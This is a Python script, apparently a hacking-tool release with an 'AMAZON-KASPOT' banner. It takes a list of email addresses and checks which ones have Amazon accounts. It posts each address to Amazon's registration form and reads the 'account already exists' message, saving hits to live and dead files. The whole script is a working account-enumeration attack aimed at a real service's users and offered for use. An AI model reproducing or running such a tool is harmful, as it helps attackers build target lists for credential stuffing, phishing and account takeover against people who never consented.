import requests
import os

live_file = open('live_emails.txt', 'w')
dead_file = open('dead_emails.txt', 'w')

banner = """                                                                                                                                                 
      ██     ▀████▄     ▄███▀     ██     ███▀▀▀███ ▄▄█▀▀██▄ ▀███▄   ▀███▀      ▀████▀ ▀███▀      ██      ▄█▀▀▀█▄████▀▀▀██▄  ▄▄█▀▀██▄ ███▀▀██▀▀███
     ▄██▄      ████    ████      ▄██▄    █▀   ███▄██▀    ▀██▄ ███▄    █          ██   ▄█▀       ▄██▄    ▄██    ▀█ ██   ▀██▄██▀    ▀██▄▀   ██   ▀█
    ▄█▀██▄     █ ██   ▄█ ██     ▄█▀██▄   ▀   ███ ██▀      ▀██ █ ███   █          ██ ▄█▀        ▄█▀██▄   ▀███▄     ██   ▄████▀      ▀██    ██     
   ▄█  ▀██     █  ██  █▀ ██    ▄█  ▀██      ███  ██        ██ █  ▀██▄ █          █████▄       ▄█  ▀██     ▀█████▄ ███████ ██        ██    ██     
   ████████    █  ██▄█▀  ██    ████████    ███   ▄█▄      ▄██ █   ▀██▄█   █████  ██  ███      ████████  ▄     ▀██ ██      ██▄      ▄██    ██     
  █▀      ██   █  ▀██▀   ██   █▀      ██  ███   ▄███▄    ▄██▀ █     ███          ██   ▀██▄   █▀      ██ ██     ██ ██      ▀██▄    ▄██▀    ██     
▄███▄   ▄████▄███▄ ▀▀  ▄████▄███▄   ▄████▄████████ ▀▀████▀▀ ▄███▄    ██        ▄████▄   ███▄███▄   ▄████▄▀█████▀▄████▄      ▀▀████▀▀    ▄████▄   
                                                                                                                                                 """

green_banner = "\033[32m" + banner + "\033[0m"
print(green_banner)
print()
print("         Developed by Security_Leader")
print("#" * 50)
print()


try:
    os.mkdir('results')
except:
    pass

email_list = input("\033[33;1m[+] Input name of the email list: \033[0m")

url = "https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fdp%2FB07Z8PWC6R%2F%3F_encoding%3DUTF8%26ref_%3Dnav_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"
headers = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}

session = requests.Session()
response = session.get(url, headers=headers)

with open(email_list) as f:
    emails = f.read().splitlines()

print("-" * 50)

for email in emails:
    data = {'customerName': 'John Doe', 'email': email, 'emailCheck': email, 'password': 'Password123', 'passwordCheck': 'Password123'}
    response = session.post(url, headers=headers, data=data)

    if "You indicated you're a new customer, but an account already exists with the email address" in response.text:
        print("\033[32;1m[+] LIVE\033[0m | {} | [\033[32;1mVALID\033[0m]".format(email))
        live_file.write(email + '\n')
    else:
        print("\033[31;1m[-] DEAD\033[0m | {} | [\033[31;1mINVALID\033[0m]".format(email))
        dead_file.write(email + '\n')

print("-" * 50)
print("\033[35mChecking process completed\033[0m")
print("Valid emails saved in: \033[32mlive_emails.txt\033[0m")
print("Invalid emails saved in: \033[31mdead_emails.txt\033[0m")
